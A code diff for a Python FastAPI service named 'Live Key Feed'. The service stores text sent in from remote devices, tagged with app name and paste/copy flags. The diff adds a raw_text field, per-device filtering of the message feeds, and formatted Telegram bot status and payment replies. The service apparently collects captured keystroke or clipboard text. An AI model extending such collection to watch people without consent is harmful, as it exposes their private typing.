@@ -1,4 +1,5 @@
 import asyncio
+import html
 import json
 import os
 import time
@@ -40,6 +41,25 @@ def telegram_configured():
     return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
 
 
+def parse_support_methods(value):
+    if value.startswith(("http://", "https://")):
+        return []
+
+    methods = []
+    for entry in value.replace("\n", ";").split(";"):
+        if "=" not in entry:
+            continue
+        name, payment_value = entry.split("=", 1)
+        name = name.strip()
+        payment_value = payment_value.strip()
+        if name and payment_value:
+            methods.append({"name": name, "value": payment_value})
+    return methods
+
+
+SUPPORT_METHODS = parse_support_methods(BUY_ME_A_COFFEE_URL)
+
+
 def telegram_api_request(method, values, timeout=10):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
     payload = urllib.parse.urlencode(values).encode("utf-8")
@@ -50,14 +70,15 @@ def telegram_api_request(method, values, timeout=10):
         return json.loads(response.read().decode("utf-8"))
 
 
-def send_telegram_message(text):
+def send_telegram_message(text, parse_mode=None):
     if not telegram_configured():
         return
 
     try:
-        telegram_api_request(
-            "sendMessage", {"chat_id": TELEGRAM_CHAT_ID, "text": text}
-        )
+        values = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+        if parse_mode:
+            values["parse_mode"] = parse_mode
+        telegram_api_request("sendMessage", values)
     except Exception as error:
         print(f"Could not send Telegram uptime notification: {error}")
 
@@ -79,24 +100,32 @@ def format_uptime(seconds):
 
 def telegram_uptime_text():
     return (
-        "Live Key Feed status: healthy\n"
-        f"Uptime: {format_uptime(time.time() - SERVICE_STARTED_AT)}\n"
-        f"Stored messages: {len(messages)}\n"
-        f"Known devices: {len(devices)}"
+        "<b>Live Key Feed</b>\n"
+        "🟢 <b>Status:</b> Healthy\n"
+        f"⏱ <b>Uptime:</b> {format_uptime(time.time() - SERVICE_STARTED_AT)}\n"
+        f"🗂 <b>Stored messages:</b> {len(messages)}\n"
+        f"📱 <b>Known devices:</b> {len(devices)}"
     )
 
 
 def telegram_devices_text():
     if not devices:
-        return "Devices\nNo devices have checked in yet."
+        return "<b>Connected devices</b>\n\nNo devices have checked in yet."
 
     now = int(time.time() * 1000)
-    lines = ["Devices"]
+    online_count = 0
+    lines = [f"<b>Connected devices</b> ({len(devices)})", ""]
     for device in sorted(devices.values(), key=lambda item: str(item.get("name", ""))):
         last_seen = int(device.get("last_seen", 0))
         online = now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
-        status = "online" if online else "offline"
-        lines.append(f"- {device.get('name', 'Unknown device')} ({device.get('id')}) - {status}")
+        if online:
+            online_count += 1
+        status = "🟢 Online" if online else "🔴 Offline"
+        age = format_uptime(max(0, (now - last_seen) // 1000))
+        name = html.escape(str(device.get("name", "Unknown device")))
+        device_id = html.escape(str(device.get("id", "unknown")))
+        lines.append(f"{status} <b>{name}</b>\n   ID: <code>{device_id}</code>\n   Last seen: {age} ago")
+    lines.insert(1, f"🟢 {online_count} online  •  🔴 {len(devices) - online_count} offline")
     return "\n".join(lines)
 
 
@@ -105,13 +134,40 @@ def telegram_messages_text():
     for item in messages:
         device_name = str(item.get("device_name", "Unknown device"))
         counts[device_name] = counts.get(device_name, 0) + 1
-    lines = [f"Stored messages: {len(messages)}"]
+    lines = [f"<b>Message summary</b>\n📨 Stored messages: <b>{len(messages)}</b>"]
     if counts:
-        lines.append("By device:")
-        lines.extend(f"- {name}: {count}" for name, count in sorted(counts.items()))
+        lines.append("\n<b>By device</b>")
+        lines.extend(
+            f"• {html.escape(name)}: {count}" for name, count in sorted(counts.items())
+        )
     else:
-        lines.append("No messages stored.")
+        lines.append("\nNo messages stored.")
     return "\n".join(lines)
+
+
+def telegram_help_text():
+    return (
+        "<b>Live Key Feed Bot</b>\n\n"
+        "Monitor your service and connected devices from Telegram.\n\n"
+        "<b>Commands</b>\n"
+        "🏠 /start - Welcome message\n"
+        "📊 /status - Service health and uptime\n"
+        "📱 /devices - Connected device status\n"
+        "📨 /messages - Message totals by device\n"
+        "💛 /support - Payment and support options\n"
+        "❓ /help - Show this help"
+    )
+
+
+def telegram_support_text():
+    if SUPPORT_METHODS:
+        lines = ["<b>Support Live Key Feed</b>", ""]
+        for method in SUPPORT_METHODS:
+            name = html.escape(method["name"])
+            value = html.escape(method["value"])
+            lines.append(f"<b>{name}</b>\n<code>{value}</code>")
+        return "\n\n".join(lines)
+    return f"<b>Support Live Key Feed</b>\n{html.escape(BUY_ME_A_COFFEE_URL)}"
 
 
 def configure_telegram_menu():
@@ -124,13 +180,12 @@ def configure_telegram_menu():
             {
                 "commands": json.dumps(
                     [
-                        {"command": "uptime", "description": "Show service uptime and status"},
+                        {"command": "start", "description": "Open the bot menu"},
+                        {"command": "help", "description": "Show available commands"},
+                        {"command": "status", "description": "Show service health and uptime"},
                         {"command": "devices", "description": "List connected devices"},
                         {"command": "messages", "description": "Show stored message totals"},
-                        {
-                            "command": "buymeacoffee",
-                            "description": "Support Live Key Feed",
-                        }
+                        {"command": "support", "description": "Show support options"},
                     ]
                 )
             },
@@ -159,20 +214,23 @@ def poll_telegram_commands():
                 command = text.split()[0] if text else ""
                 command = command.split("@", 1)[0]
                 reply = None
-                if command == "/uptime":
+                if command in {"/start", "/help"}:
+                    reply = telegram_help_text()
+                elif command in {"/uptime", "/status"}:
                     reply = telegram_uptime_text()
                 elif command == "/devices":
                     reply = telegram_devices_text()
                 elif command == "/messages":
                     reply = telegram_messages_text()
-                elif command == "/buymeacoffee":
-                    reply = f"Support Live Key Feed: {BUY_ME_A_COFFEE_URL}"
+                elif command in {"/support", "/buymeacoffee"}:
+                    reply = telegram_support_text()
                 if reply:
                     telegram_api_request(
                         "sendMessage",
                         {
                             "chat_id": TELEGRAM_CHAT_ID,
                             "text": reply,
+                            "parse_mode": "HTML",
                         },
                     )
         except HTTPError as error:
@@ -293,6 +351,7 @@ def load_file_messages():
                 {
                     "id": int(ts),
                     "text": text.strip(),
+                    "raw_text": text.strip(),
                     "time": int(ts),
                     "device_id": device_id,
                     "device_name": device_name,
@@ -315,7 +374,7 @@ def load_text_messages():
                 with connection.cursor() as cursor:
                     cursor.execute(
                         """
-                        SELECT id, text, device_id, device_name, app_name, time, is_pasted, is_copied
+                        SELECT id, text, raw_text, device_id, device_name, app_name, time, is_pasted, is_copied
                         FROM messages
                         ORDER BY time DESC
                         LIMIT %s
@@ -327,12 +386,13 @@ def load_text_messages():
                 {
                     "id": row[0],
                     "text": row[1],
-                    "device_id": row[2],
-                    "device_name": row[3],
-                    "app_name": row[4],
-                    "time": row[5],
-                    "is_pasted": row[6],
-                    "is_copied": row[7],
+                    "raw_text": row[2] or row[1],
+                    "device_id": row[3],
+                    "device_name": row[4],
+                    "app_name": row[5],
+                    "time": row[6],
+                    "is_pasted": row[7],
+                    "is_copied": row[8],
                 }
                 for row in reversed(rows)
             ]
@@ -392,12 +452,13 @@ def save_message(item):
         with connection.cursor() as cursor:
             cursor.execute(
                 """
-                INSERT INTO messages (id, text, device_id, device_name, app_name, time, is_pasted, is_copied)
-                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+                INSERT INTO messages (id, text, raw_text, device_id, device_name, app_name, time, is_pasted, is_copied)
+                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
                 """,
                 (
                     item["id"],
                     item["text"],
+                    item["raw_text"],
                     item["device_id"],
                     item["device_name"],
                     item["app_name"],
@@ -445,6 +506,7 @@ def write_text_log():
 
 class MessageInput(BaseModel):
     text: str
+    raw_text: str = ""
     device_id: str = "unknown"
     device_name: str = "Unknown device"
     app_name: str = "Unknown app"
@@ -469,13 +531,21 @@ async def root():
 
 
 @app.get("/messages")
-async def fetch_messages():
-    return JSONResponse(list(messages))
+async def fetch_messages(device_id: str | None = None):
+    selected_device_id = (device_id or "").strip()
+    result = [
+        item for item in messages
+        if not selected_device_id or str(item.get("device_id")) == selected_device_id
+    ]
+    return JSONResponse(result)
 
 
 @app.get("/api/config")
 async def fetch_config():
-    return JSONResponse({"buy_me_a_coffee_url": BUY_ME_A_COFFEE_URL})
+    return JSONResponse({
+        "buy_me_a_coffee_url": BUY_ME_A_COFFEE_URL if not SUPPORT_METHODS else "",
+        "payment_methods": SUPPORT_METHODS,
+    })
 
 
 @app.get("/api/devices")
@@ -559,6 +629,7 @@ async def add_message(payload: MessageInput, x_api_key: str | None = Header(defa
     app_name = payload.app_name.strip() or "Unknown app"
     is_pasted = payload.is_pasted
     is_copied = payload.is_copied
+    raw_text = payload.raw_text.strip() or text
     previous_device = devices.get(device_id, {})
     devices[device_id] = {
         "id": device_id,
@@ -571,6 +642,7 @@ async def add_message(payload: MessageInput, x_api_key: str | None = Header(defa
     item = {
         "id": now,
         "text": text,
+        "raw_text": raw_text,
         "time": now,
         "device_id": device_id,
         "device_name": device_name,
@@ -590,14 +662,16 @@ async def add_message(payload: MessageInput, x_api_key: str | None = Header(defa
 
 
 @app.get("/events")
-async def events(request: Request):
+async def events(request: Request, device_id: str | None = None):
+    selected_device_id = (device_id or "").strip()
     async def event_generator():
         last_seen = max((int(item["id"]) for item in messages), default=0)
         while True:
             for msg in list(messages):
                 msg_id = int(msg["id"])
                 if msg_id > last_seen:
-                    yield f"data: {json.dumps(msg)}\n\n"
+                    if not selected_device_id or str(msg.get("device_id")) == selected_device_id:
+                        yield f"data: {json.dumps(msg)}\n\n"
                     last_seen = msg_id
             if await request.is_disconnected():
                 break
